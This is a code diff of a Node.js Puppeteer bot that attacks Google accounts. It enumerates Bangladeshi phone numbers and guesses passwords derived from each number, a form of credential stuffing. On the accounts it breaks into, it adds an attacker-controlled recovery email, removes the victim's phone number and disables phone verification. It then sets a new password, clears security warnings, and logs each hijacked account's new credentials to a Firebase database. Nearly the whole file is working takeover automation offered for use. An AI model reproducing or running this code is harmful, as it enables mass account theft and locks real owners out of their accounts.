@@ -1,5 +1,6 @@
 const puppeteer = require('./Puppeteer.js')
 const request = require('request')
+const fs = require('fs')
 
 let SERVER = ''
 let SIRIAL = ''
@@ -11,15 +12,17 @@ let mLoadSuccess = false
 let mPrevNumber = 0
 let mPasswordTry = 0
 let mCapture = false
-let mPassword = 'null'
-let mPasswordChange = false
-let mLoadPassword = false
-let mLogoutGmail = false
-let mGmailCheck = false
 let mNumber = 0
 let mLoad = 0
 let mSirial = 0
 let timer = null
+let mChangeTime = 0
+let mProcess = 0
+let mAUth = null
+let mGmail = 'null'
+let mPassword = 'null'
+let mRecoveryMail = 'null'
+let mRecovery = null
 
 let page = null
 let browser = null
@@ -37,12 +40,10 @@ module.exports = class {
 
         mLoadSuccess = false
         mPrevNumber = 0
-        mNumber = 0
         mPasswordTry = 0
         mCapture = false
-        mLoadPassword = false
-        mLogoutGmail = false
-        mGmailCheck = false
+        mAUth = null
+        mProcess = 0
         mNumber = 0
         mLoad = 0
         mSirial = 0
@@ -51,7 +52,7 @@ module.exports = class {
         browser = null
 
         raiyan = 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/number/'
-        signin = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&hl=en-US&continue=https://myaccount.google.com/intro/security&csig=AF-SEnY7bxxtADWhtFc_:1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+        signin = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&hl=en-US&continue=https://myaccount.google.com/phone&csig=AF-SEnY7bxxtADWhtFc_:1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
         
         update = parseInt(new Date().getTime() / 1000)
         
@@ -59,15 +60,19 @@ module.exports = class {
         timer = setInterval(function() {
             let now = parseInt(new Date().getTime() / 1000)
 
-            if(((now-update) > 60 && mLoadSuccess) || (mNumber == mPrevNumber && mLoadSuccess)) {
+            if(((now-update) > 30 && mLoadSuccess) || (mNumber == mPrevNumber && mLoadSuccess && !mAUth)) {
                 console.log('---Restart Browser--- ID: '+SIZE)
-                restart()
+                process.exit(1)
             }
 
             if(mLoadSuccess) {
                 mPrevNumber = mNumber
             }
         },60000)
+
+        setInterval(async function() {
+            if(mLoadSuccess) await requestUpdate()
+        }, 1000)
     }
 
     async start() {
@@ -92,7 +97,6 @@ module.exports = class {
                         } else {
                             mSirial = parseInt(body['start_'+SIZE])
                             mNumber = parseInt(body['runing_'+SIZE])
-                            //mNumber = 1748043876
                         }
                         
                         if(mNumber == 0) {
@@ -105,8 +109,6 @@ module.exports = class {
                         }
                     }
                 })
-            } else {
-                console.log(error)
             }
         })
     }
@@ -118,6 +120,8 @@ async function startService() {
 
     ;(async () => {
 
+        mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))
+
         browser = await puppeteer.launch({
             headless: true,
             args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
@@ -127,253 +131,10 @@ async function startService() {
 
         await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')
 
-        await page.setRequestInterceptionEnabled(true)
-        
         page.on('request', async request => {
-            const url = request.url
+
             update = parseInt(new Date().getTime() / 1000)
-            if(url.startsWith('https://fonts.gstatic.com/s/') || url.startsWith('https://accounts.google.com/_/kids/signup/eligible') || url.startsWith('https://accounts.google.com/generate')) {
-                request.abort()
-            } else {
-                request.continue()
-            }
 
-            if(url.startsWith('https://accounts.google.com/_/lookup/accountlookup') && mLoadSuccess) {
-                await delay(1000)
-                const output = await page.evaluate(() => {
-                    let root = document.querySelector('div.o6cuMc')
-                    if(root && root.innerHTML.includes(`Couldn't find your Google Account. Try using your email address instead.`)) {
-                        return true
-                    } else {
-                        return false
-                    }
-                })
-
-                const block = await page.evaluate(() => {
-                    let root = document.querySelector('#headingText')
-                    if(root && root.innerText.includes(`Couldn’t sign you in`)) {
-                        return true
-                    } else {
-                        return false
-                    }
-                })
-
-                if(block) {
-                    mNumber++
-                    mLoad++
-                    mPasswordTry = 0
-                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-                    page.goBack()
-                } else {
-                    if(output) {
-                        mNumber++
-                        mLoad++
-                        if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
-                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
-                        } else {
-                            if(mLoad % 10 == 0) {
-                                console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
-                                database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-                            }
-                            await page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
-                            await page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
-                        }
-                    }
-                }
-            } else if(url.startsWith('https://accounts.google.com/generate') && mLoadSuccess) {
-                const output = await page.evaluate(() => {
-                    let root = document.querySelector('#identifierNext')
-                    if(root) {
-                        return true
-                    } else {
-                        return false
-                    }
-                })
-
-                mCapture = false
-
-                const block = await page.evaluate(() => {
-                    let root = document.querySelector('#headingText')
-                    if(root && root.innerText.includes(`Couldn’t sign you in`)) {
-                        return true
-                    } else {
-                        return false
-                    }
-                })
-
-                if(block) {
-                    mNumber++
-                    mLoad++
-                    mPasswordTry = 0
-                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-                    page.goBack()
-                } else {
-                    if(output) {
-                        await page.evaluate((number) => { let root = document.querySelector('input[type="email"]'); if(root) root.value = number }, '+880'+mNumber)
-                        await page.evaluate(() => { try { let root = document.querySelector('#identifierNext'); if(root) root.click() } catch(e) {} })
-                    } else {
-                        await checkPassword()
-                    }
-                }
-            } else if(url.startsWith('https://accounts.google.com/_/signin/challenge')) {
-                await delay(1000)
-                const output = await page.evaluate(() => {
-                    let root = document.querySelector('div.OyEIQ.uSvLId')
-                    if(root && (root.innerHTML.includes('Wrong password. Try again or click Forgot password to reset it') || root.innerHTML.includes('Your password was changed'))) {
-                        return true
-                    } else {
-                        return false
-                    }
-                })
-                
-                if(output) {
-                    await checkPassword()
-                }
-            } else if(url.startsWith('https://accounts.google.com/Captcha')) {
-                if(!mCapture) {
-                    mCapture = true
-                    mPasswordTry = 0
-                    mNumber++
-                    mLoad++
-                    let output = await page.evaluate(() => {
-                        try {
-                            let root = document.querySelector('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
-                            if(root) {
-                                root.click()
-                                return true
-                            }
-                        } catch (e) {}
-                        return false
-                    })
-
-                    if(!output) {
-                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-                        mPasswordTry = 0
-                        await page.goto(signin)
-                    }
-                }
-            } else if(mLoadPassword) {
-                let pageUrl = page.url()
-                if(pageUrl == 'https://myaccount.google.com/security' || pageUrl.startsWith('https://gds.google.com/web/chip') || pageUrl.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
-                    mLoadPassword = false
-                    mGmailCheck = true
-                    await page.goto('https://myaccount.google.com/email')
-                } else {
-                    await delay(2000)
-                    const header = await page.evaluate(() => {
-                        let root = document.querySelector('#headingText')
-                        if(root) {
-                            let text = root.innerText
-                            if(text.includes(`Verify it’s you`)) {
-                                root = document.querySelectorAll('li.JDAKTe.cd29Sd.zpCp3.SmR8')
-                                if(root) {
-                                    for(let i=0; i<root.length; i++) {
-                                        if(root[i].innerText.includes('Use another phone or computer to finish signing in')) {
-                                            return '1'
-                                        }
-                                    }
-                                }
-                                return '2'
-                            } else if(text.includes(`Couldn’t sign you in`)) {
-                                return '3'
-                            } else if(text.includes(`2-Step Verification`)){
-                                return '4'
-                            } else if(text.includes('Your account has been disabled')) {
-                                return '5'
-                            } else if(text.includes(`Change password`)) {
-                                return '6'
-                            }
-                        }
-                        return '0'
-                    })
-
-                    if(header != 0 && mLoadPassword) {
-                        if(header == 6) {
-                            mPasswordChange = true
-
-                            let random = getRandomPassword()
-                            if(random != mPassword) {
-                                mPassword = random
-                                await page.evaluate((pass) => {
-                                    let root = document.querySelectorAll('input.whsOnd.zHQkBf')
-                                    if(root) {
-                                        if(root.length == 2) {
-                                            root[0].value = pass
-                                            root[1].value = pass
-                                        }
-                                    }
-                                }, mPassword)
-    
-                                console.log('Password: '+mPassword)
-    
-                                await page.evaluate(() => document.querySelector('div.VfPpkd-RLmnJb').click())
-                            }
-                        } else {
-                            mLoadPassword = false
-                            mNumber++
-                            mLoad++
-                            if(header == 1) {
-                                database.set('/number/menually/'+(mNumber-1),mPasswordTry)
-                            } else {
-                                database.set('/number/reject/'+(mNumber-1),mPasswordTry)
-                            }
-                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-                            mPasswordTry = 0
-                            mPassword = 'null'
-                            page.goBack()
-                        }
-                    }
-                }
-            } else if(mGmailCheck) {
-                const gmail = await page.evaluate(() => {
-                    let root = document.querySelector('div.mMsbvc')
-                    if(root) {
-                        return root.innerText
-                    } else {
-                        return null
-                    }
-                })
-
-                if(gmail && mGmailCheck) {
-                    mGmailCheck = false
-                    mNumber++
-                    mLoad++
-                    let now = parseInt(new Date().getTime() / 60000)
-                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-                    if(mPasswordChange) {
-                        database.update('/number/change/'+gmail.replace('@gmail.com', '').replace('.',''), { number : mNumber-1, pass : mPassword, time : now })
-                        mPasswordChange = false
-                        mPassword = 'null'
-                    } else {
-                        database.update('/number/active/'+gmail.replace('@gmail.com', '').replace('.',''), { number : mNumber-1, pass : mPasswordTry, time : now })
-                    }
-                    mPasswordTry = 0
-                    await delay(1000)
-                    let temp = JSON.parse(fs.readFileSync('./cookies.json'))
-                    await page.setCookie(...temp)
-                    mLogoutGmail = true
-                    mGmailAdress = gmail
-                    await page.goto(signin)
-                }
-            } else if(mLogoutGmail) {
-                const sinout = await page.evaluate(() => {
-                    let root = document.querySelector('#headingText')
-                    if(root && root.innerText.includes(`Choose an account`)) {
-                        return true
-                    } else {
-                        return false
-                    }
-                })
-                
-                if(sinout && mLogoutGmail) {
-                    mLogoutGmail = false
-                    await page.evaluate(() => document.querySelector('ul.OVnw0d > li:nth-child(3) > div').click())
-                    await delay(1000)
-                    await page.evaluate(() => document.querySelector('ul.OVnw0d > li:nth-child(1) > div > div.n3x5Fb').click())
-                    await delay(1000)
-                    await page.evaluate(() => document.querySelector('div.ZFr60d.CeoRYc').click())
-                }
-            }
         })
 
         page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
@@ -386,47 +147,713 @@ async function startService() {
     })()
 }
 
+async function requestUpdate() {
+    let url = page.url()
+    
+    const block = await page.evaluate(() => {
+        let root = document.querySelector('#headingText')
+        if(root && root.innerText.includes(`Couldn’t sign you in`)) {
+            return true
+        } else {
+            return false
+        }
+    })
+
+    if(block) {
+        mAUth = null
+        mProcess = 0
+        mPasswordTry = 0
+        page.goto(signin)
+    } else {
+        let check = null
+
+        if(mProcess == 0) {
+            //Type phone number & Submit
+            mProcess = 99
+            check = await exits('div.Y4dIwd > span')
+            if(check) {
+                check = await page.evaluate((number) => { 
+                    let root = document.querySelector('input[type="email"]'); 
+                    if(root) {
+                        root.value = number
+                        return true 
+                    }
+                }, '+880'+mNumber)
+
+                if(check) {
+                    mNumber++
+                    mLoad++
+                    if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
+                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
+                    } else {
+                        if(mLoad % 10 == 0) {
+                            console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
+                            database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                        }
+                        check = await click('#identifierNext')
+                        if(check) {
+                            mProcess = 1
+                        }
+                    }
+                }
+            }
+            if(mProcess != 1) {
+                mAUth = null
+                mProcess = 0
+                mPasswordTry = 0
+            }
+        } else if(mProcess == 1) {
+            //check wrong phone number or has capture
+            mProcess = 99
+            check = await exits('div.o6cuMc')
+            if(check) {
+                //Number Can't found. check next number
+                check = await page.evaluate((number) => { 
+                    let root = document.querySelector('input[type="email"]'); 
+                    if(root) {
+                        root.value = number
+                        return true 
+                    }
+                }, '+880'+mNumber)
+
+                if(check) {
+                    mNumber++
+                    mLoad++
+                    if(mLoad % 10 == 0) {
+                        console.log('ID:' +SIZE+' --- '+mLoad+' --- Null')
+                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                    }
+                    await click('#identifierNext')
+                }
+            } else {
+                check = await exits('div[class="Wzzww"]')
+                if(check) {
+                    //captcha found. check next number
+                    mAUth = null
+                    mProcess = 0
+                    mPasswordTry = 0
+                    database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                    page.goto(signin)
+                } else {
+                    check = await exits('#passwordNext')
+                    if(check) {
+                        mProcess = 2
+                    }
+                }
+            }
+            if(mProcess != 0) {
+                if(mProcess != 2) {
+                    mProcess = 1
+                }
+            }
+        } else if(mProcess == 2) { 
+            //Type password & Submit
+            mProcess = 99
+            check = await exits('#passwordNext')
+            if(check) {
+                check = await exits('div.OyEIQ.uSvLId > div')
+                if(check || mPasswordTry == 0) {
+                    check = await checkPassword()
+                    if(check) {
+                        mAUth = null
+                        mPasswordTry = 0
+                        mProcess = 0
+                        await click('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
+                    } else {
+                        check = await page.evaluate(() => document.querySelector('input[type="password"]').value)
+                        if(check && check != '') {
+                            mPasswordTry++
+                            mProcess = 2
+                        }
+                    }
+                } else {
+                    check = await exits('div[class="Wzzww"]')
+                    if(check) {
+                        //captcha found. check next number
+
+                        mAUth = null
+                        mProcess = 0
+                        mPasswordTry = 0
+                        database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
+                        await click('div.YZrg6.HnRr5d.iiFyne.cd29Sd')
+                    } else {
+                        mProcess = 4
+                    }
+                }
+            } else{
+                mProcess = 2
+            }
+        } else if(mProcess == 4) {
+            //Check login success or any error
+            mProcess = 99
+            if(url.startsWith('https://myaccount.google.com/phone') || url.startsWith('https://gds.google.com/web/chip') || url.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
+                if(url.startsWith('https://myaccount.google.com/phone')) {
+                    mAUth = null
+                } else {
+                    let start = url.indexOf('rapt=')
+                    let end = url.indexOf('&pli=1')
+                    if(start != -1) {
+                        if(end == -1) {
+                            end = url.length
+                        }
+                        mAUth = url.substring(start+5, end)
+                    } else {
+                        mAUth = null
+                    }
+                }
+                if(mAUth) {
+                    page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
+                    mProcess = 10
+                } else {
+                    mProcess = 6
+                }
+            } else {
+                //Login Error. Check Error Type 
+                const header = await page.evaluate(() => {
+                    let root = document.querySelector('#headingText')
+                    if(root) {
+                        let text = root.innerText
+                        if(text.includes(`Change password`)) {
+                            return '1'
+                        } else if(text.includes(`Verify it’s you`)) {
+                            root = document.querySelectorAll('li.JDAKTe.cd29Sd.zpCp3.SmR8 > div')
+                            if(root) {
+                                for(let i=0; i<root.length; i++) {
+                                    let type = root[i].getAttribute('data-challengetype')
+                                    if(type) {
+                                        if(type != 'undefined' && parseInt(type) == 42) {
+                                            return '6'
+                                        }
+                                    }
+                                }
+                            }
+                            return '2'
+                        } else if(text.includes(`Couldn’t sign you in`)) {
+                            return '3'
+                        } else if(text.includes(`2-Step Verification`)){
+                            return '4'
+                        } else if(text.includes('Your account has been disabled')) {
+                            return '5'
+                        }
+                    }
+                    return '0'
+                })
+
+                if(header != 0) {
+                    let now = parseInt(new Date().getTime() / 1000)
+                    if(header == 1 && parseInt(now-mChangeTime) > 10) {
+                        database.set('/number/password/'+(mNumber-1), mPasswordTry)
+                        page.goBack()
+                        mAUth = null
+                        mProcess = 0
+                        mPasswordTry = 0
+                    } else {
+                        if(header == 6) {
+                            database.set('/number/menually/'+(mNumber-1), mPasswordTry)
+                        } else {
+                            database.set('/number/reject/'+(mNumber-1), mPasswordTry)
+                        }
+                        page.goBack()
+                        mAUth = null
+                        mProcess = 0
+                        mPasswordTry = 0
+                    }
+                } else {
+                    await delay(500)
+                    mProcess = 4
+                }
+            }
+        } else if(mProcess == 5) {
+            //Check login success or any error
+            mProcess = 99
+            if(url.startsWith('https://myaccount.google.com/phone') || url.startsWith('https://gds.google.com/web/chip') || url.startsWith('https://myaccount.google.com/signinoptions/recovery-options-collection')) {
+                if(url.startsWith('https://myaccount.google.com/phone')) {
+                    mAUth = null
+                } else {
+                    let start = url.indexOf('rapt=')
+                    let end = url.indexOf('&pli=1')
+                    if(start != -1) {
+                        if(end == -1) {
+                            end = url.length
+                        }
+                        mAUth = url.substring(start+5, end)
+                    } else {
+                        mAUth = null
+                    }
+                }
+                if(mAUth) {
+                    page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
+                    mProcess = 10
+                } else {
+                    mProcess = 6
+                }
+            } else {
+                mProcess = 5
+            }
+        } else if(mProcess == 6 || mProcess == 23) {
+            //Check Auth. Has Phone Number or Not
+            if(mProcess == 6) {
+                mProcess = 66
+            } else {
+                mProcess = 99
+            }
+            check = await exits('h1.ZZ9xL')
+            
+            if(check) {
+                check = await click('div.ujJYOe')
+                if(check) {
+                    if(mProcess == 66) {
+                        mProcess = 7
+                    } else {
+                        mProcess = 24
+                    }
+                } else {
+                    if(mProcess == 66) {
+                        check = await click('div.I68Wpe')
+                        if(check) {
+                            mProcess = 8
+                        } else {
+                            mProcess = 6
+                        }
+                    } else {
+                        mProcess = 26
+                    }   
+                }
+            } else {
+                if(mProcess == 66) {
+                    mProcess = 6
+                } else {
+                    mProcess = 23
+                }
+            }
+        } else if(mProcess == 7 || mProcess == 24) {
+            //Check Auth. Delete Phone Number
+            if(mProcess == 7) {
+                mProcess = 77
+            } else {
+                mProcess = 99
+            }
+            check = await page.evaluate(() => {
+                let root = document.querySelectorAll('button.VfPpkd-Bz112c-LgbsSe.yHy1rc.eT1oJ.DiOXab')
+                if(root && root.length == 4) {
+                    root[3].click()
+                    return true
+                } else {
+                    return false
+                }
+            })
+            
+            if(check) {
+                if(mProcess == 77) {
+                    mProcess = 8
+                } else {
+                    mProcess = 25
+                }
+            } else {
+                if(mProcess == 77) {
+                    mProcess = 7
+                } else {
+                    mProcess = 24
+                }
+            }
+        } else if(mProcess == 8) {
+            //Check Auth. Login Again
+            mProcess = 99
+            await delay(500)
+            check = await page.evaluate((pass) => {
+                let root = document.querySelector('input[type="password"]')
+                if(root) {
+                    root.value = pass
+                    return true
+                } else {
+                    return false
+                }  
+            }, mPassword)  
+            
+            if(check) {
+                check = await click('#passwordNext')
+                if(check) {
+                    mProcess = 9
+                } else {
+                    mProcess = 8
+                }
+            } else {
+                mProcess = 8
+            }
+        } else if(mProcess == 9) {
+            //Check Auth.
+            if(url.startsWith('https://myaccount.google.com/phone?')) {
+                let start = url.indexOf('rapt=')
+                if(start != -1) {
+                    mAUth = url.substring(start+5, url.length)
+                }
+            }
+            if(mAUth) {
+                page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
+                mProcess = 10
+            }
+        } else if(mProcess == 10) {
+            //Check Already Add Recovery Gmail
+            mProcess = 99
+            let cmd ='button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.qfvgSe.SdOXCb'
+            check = await exits(cmd)
+            
+            if(check) {
+                check = await page.evaluate((id) => {
+                    let root = document.querySelector(id)
+                    if(root) {
+                        if(root.getAttribute('disabled') != null) {
+                            return true
+                        }
+                    }
+                    return false
+                }, cmd)
+
+                if(check) {
+                    for(let i=0; i<7; i++) {
+                        await page.keyboard.down('Tab')
+                    }
+                    await delay(420)
+                    await page.keyboard.down('Control')
+                    await page.keyboard.down('x')
+                    await page.keyboard.up('x')
+                    await page.keyboard.up('Control')
+                }
+                mProcess = 11
+            }else {
+                mProcess = 10
+            }
+        } else if(mProcess == 11) {
+            //Set Recovery Gmail
+            mProcess = 99
+
+            let position = Math.floor((Math.random() * mRecovery.length))
+            mRecoveryMail = mRecovery[position]
+
+            check = await page.evaluate((gmail) => {
+                let root = document.querySelector('input#i5')
+                if(root) {
+                    root.value = gmail
+                    return true
+                } else {
+                    return false
+                }
+            }, mRecoveryMail+'@gmail.com')
+
+            if(check) {
+                mProcess = 12
+            } else {
+                mProcess = 11
+            }
+        } else if(mProcess == 12) {
+            //Submit Recovery Gmail
+            mProcess = 99
+            check = await page.evaluate(() => {
+                let root = document.querySelector('button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.qfvgSe.SdOXCb')
+                if(root) {
+                    if(root.getAttribute('disabled') != null) {
+                        return 1
+                    } else {
+                        root.click()
+                        return 2
+                    }
+                }
+                return 0
+            })
+
+            if(check == 1) {
+                page.goto('https://myaccount.google.com/recovery/email?rapt='+mAUth)
+                mProcess = 10
+            } else if(check == 2) {
+                mProcess = 13
+            } else {
+                mProcess = 12
+            }
+        } else if(mProcess == 13) {
+            //check Recovery Code
+            mProcess = 99
+            check = await exits('input#c2')
+
+            if(check) {
+                page.goto('https://myaccount.google.com/signinoptions/phone-sign-in?pli=1&rapt='+mAUth)
+                mProcess = 14
+            } else {
+                mProcess = 13
+            }
+        } else if(mProcess == 14) {
+            //Check Phone Verifcation
+            mProcess = 99
+            let check = await exits('div.wLocpe') 
+            if(check) {
+                page.goto('https://myaccount.google.com/signinoptions/password?rapt='+mAUth)
+                mProcess = 16
+            } else {
+                check = await click('div.U26fgb.O0WRkf.zZhnYe.e3Duub.C0oVfc.Zrq4w.Us8aEd.mc2LctosR4.M9Bg4d')
+                if(check) {
+                    mProcess = 15
+                } else {
+                    mProcess = 14
+                }
+            }
+        } else if(mProcess == 15) {
+            //Trun Off Phone Verifaction
+            mProcess = 99
+            check = await click('div.U26fgb.O0WRkf.oG5Srb.HQ8yf.C0oVfc.kHssdc.HvOprf.FsOtSd.M9Bg4d')
+
+            if(check) {
+                page.goto('https://myaccount.google.com/signinoptions/password?rapt='+mAUth)
+                mProcess = 16
+            } else {
+                mProcess = 15
+            }
+        } else if(mProcess == 16) {
+            //Set New Password, check Input Box
+            mProcess = 99
+
+            check = await exits('input.VfPpkd-fmcmS-wGMbrd.uafD5')
+            if(check) {
+                mProcess = 17
+            } else {
+                if(url == 'https://myaccount.google.com/security') {
+                    page.goto('https://myaccount.google.com/signinoptions/password?rapt='+mAUth)
+                }
+                mProcess = 16
+            }
+        } else if(mProcess == 17) {
+            //Set New Password, Type Input Box
+            mProcess = 99
+
+            mPassword = getRandomPassword()
+
+            check = await page.evaluate((pass) => {
+                let root = document.querySelectorAll('input.VfPpkd-fmcmS-wGMbrd.uafD5')
+                if(root) {
+                    if(root.length == 2) {
+                        root[0].value = pass
+                        root[1].value = pass
+                        return true
+                    }
+                }
+                return false
+            }, mPassword)
+
+            if(check) {
+                mProcess = 18
+            } else {
+                mProcess = 17
+            }
+        } else if(mProcess == 18) {
+            //Set New Password, Submit Password & data upload on server
+            mProcess = 99
+
+            let gmail = await page.evaluate(() => {
+                let root = document.querySelector('input[type="email"]')
+                if(root) {
+                    return root.value
+                }
+                return false
+            })
+
+            if(gmail && gmail.endsWith('@gmail.com')) {
+
+                check = await click('div.VfPpkd-RLmnJb')
+                if(check) {
+                    mGmail = gmail.replace('@gmail.com', '').replace('.', '')
+                    let now = parseInt(new Date().getTime() / 1000)
+                    database.update('/number/completed/'+mGmail, { active : now, password : mPassword, number : (mNumber-1), recovery : mRecoveryMail })
+                    
+                    mProcess = 19
+                } else {
+                    mProcess = 18
+                }
+            } else {
+                mProcess = 18
+            }
+        } else if(mProcess == 19) {
+            //check Success Password Change
+            mProcess = 99
+            check = await exits('div.eB5Kz')
+            if(check) {
+                page.goto('https://myaccount.google.com/security-checkup/4')
+                mProcess = 20
+            } else {
+                mProcess = 19
+            }
+        } else if(mProcess == 20) {
+            //Clear Worning Notification
+            mProcess = 99
+            check = await exits('div.RAjCxe')
+            if(check) {
+                check = await click('button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.qfvgSe.SdOXCb.I7EV9e')
+                if(check) {
+                    mProcess = 21
+                } else {
+                    page.goto('https://myaccount.google.com/security-checkup/7')
+                    mProcess = 22
+                }
+            } else {
+                mProcess = 20
+            }
+        } else if(mProcess == 21) {
+            //Clear Singel Notification & back
+            mProcess = 99
+            check = await exits('div.BNK4qe')
+            if(check) {
+                check = await click('button.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-INsAgc.VfPpkd-LgbsSe-OWXEXe-Bz112c-M1Soyc.Rj2Mlf.OLiIxf.PDpWxe.qfvgSe.SdOXCb.uz4FJf.VmUnYb.cOqjte')
+                if(check) {
+                    mProcess = 20
+                } else {
+                    mProcess = 21
+                }
+            } else {
+                mProcess = 21
+            }
+        } else if(mProcess == 22) {
+            //Dismiss Save Browser & Clear cookies
+            mProcess = 99
+            check = await click('div.VfPpkd-RLmnJb')
+            if(check) {
+                page.goto('https://myaccount.google.com/phone?rapt='+mAUth)
+                mProcess = 23
+            } else {
+                check = await exits('div.Iyifm')
+                if(check) {
+                    page.goto('https://myaccount.google.com/phone?rapt='+mAUth)
+                    mProcess = 23
+                } else {
+                    mProcess = 22
+                }
+            }
+        } else if(mProcess == 25) {
+            //Delete Confrom, Phone number
+            mProcess = 99
+            check = await click('div.U26fgb.O0WRkf.oG5Srb.HQ8yf.C0oVfc.kHssdc.HvOprf.FsOtSd.M9Bg4d')
+            if(check) {
+                mProcess = 26
+            } else {
+                mProcess = 25
+            }
+        } else if(mProcess == 26) {
+            //clear Cookies
+            mProcess = 27
+            let temp = JSON.parse(fs.readFileSync('./cookies.json'))
+            await page.setCookie(...temp)
+            page.goto(signin)
+
+        } else if(mProcess == 27) {
+            //Log Out Gmail & Remove It.
+            mProcess = 99
+            
+            check = await exits('#headingText')
+
+            if(check) {
+                check = await click('ul.OVnw0d > li:nth-child(3) > div')
+                if(check) { 
+                    mProcess = 28
+                } else {
+                    mProcess = 27
+                }
+            } else {
+                mProcess = 27
+            }
+        } else if(mProcess == 28) {
+            //Remove It & Accept popup dialog.
+            mProcess = 99
+            check = await click('ul.OVnw0d > li:nth-child(1) > div > div.n3x5Fb')
+            if(check) {
+                mProcess = 29
+            } else {
+                mProcess = 28
+            }
+        } else if(mProcess == 29) {
+            //Remove It. Confrom
+            mProcess = 99
+            check = await click('div.ZFr60d.CeoRYc')
+            if(check) {
+                mAUth = null
+                mProcess = 0
+                mPasswordTry = 0
+            } else {
+                mProcess = 30
+            }
+        }
+    }
+}
+
 async function checkPassword() {
     if(mPasswordTry >= 3) {
-        mPasswordTry = 0
-        mNumber++
-        mLoad++
-        mLoadPassword = false
         if(parseInt(mSirial)+1 <= parseInt(mNumber/1000000)) {
             database.set('/number/server/'+SERVER+'/runing_'+SIZE, 0)
         } else {
             database.set('/number/server/'+SERVER+'/runing_'+SIZE, mNumber)
-            page.goBack()
         }
+        return true
     } else {
-        let password = ''
         if(mPasswordTry == 0) {
-            password = '0'+mNumber
-            console.log('ID:' +SIZE+' --- '+mLoad+' --- +88'+password)
+            mPassword = '0'+(mNumber-1)
+            console.log('ID:' +SIZE+' --- '+mLoad+' --- +88'+mPassword)
         } else if(mPasswordTry == 1) {
-            let temp = '0'+mNumber
-            password = temp.substring(0, 8)
+            let temp = '0'+(mNumber-1)
+            mPassword = temp.substring(0, 8)
         } else if(mPasswordTry == 2) {
-            let temp = '0'+mNumber
-            password = temp.substring(3, 11)
+            let temp = '0'+(mNumber-1)
+            mPassword = temp.substring(3, 11)
         }
-        await page.evaluate((pass) => document.querySelector('input[type="password"]').value = pass, password)
-        mPasswordTry++
-        await page.evaluate(() => document.querySelector('#passwordNext').click())
-        mLoadPassword = true
+
+        await page.evaluate((pass) => document.querySelector('input[type="password"]').value = pass , mPassword)
+        await click('#passwordNext')
+        return false
     }
 }
 
-function getRandomPassword() {
-    if(mPassword == 'null') {
-        return Math.random().toString(36).slice(-10)
-    } else {
-        return mPassword
-    }  
+async function click(id) {
+    let output = await page.evaluate((id) => {
+        let root = document.querySelector(id)
+        if(root) {
+            root.click()
+            return true
+        } else {
+            return false
+        }
+    }, id)
+    return output
 }
+
+async function exits(id) {
+    let output = await page.evaluate((id) => {
+        let root = document.querySelector(id)
+        if(root) {
+            return true
+        } else {
+            return false
+        }
+    }, id)
+    return output
+}
+
+function getRandomPassword() {
+    let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
+    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
+    let N = ['0','1','2','3','4','5','6','7','8','9']
+    let U = ['#','$','@']
+    
+    let pass = C[Math.floor((Math.random() * 26))]
+    pass = pass+ S[Math.floor((Math.random() * 26))]
+    pass = pass+ S[Math.floor((Math.random() * 26))]
+    pass = pass+ S[Math.floor((Math.random() * 26))]
+    pass = pass+ S[Math.floor((Math.random() * 26))]
+    pass = pass+ N[Math.floor((Math.random() * 10))]
+    pass = pass+ N[Math.floor((Math.random() * 10))]
+    pass = pass+ N[Math.floor((Math.random() * 10))]
+    pass = pass+ U[Math.floor((Math.random() * 3))]
+    pass = pass+ U[Math.floor((Math.random() * 3))]
+    
+    return pass
+}
+
 
 async function delay(time) {
     return new Promise(function(resolve) { 
         setTimeout(resolve, time)
     });
-    }
+}
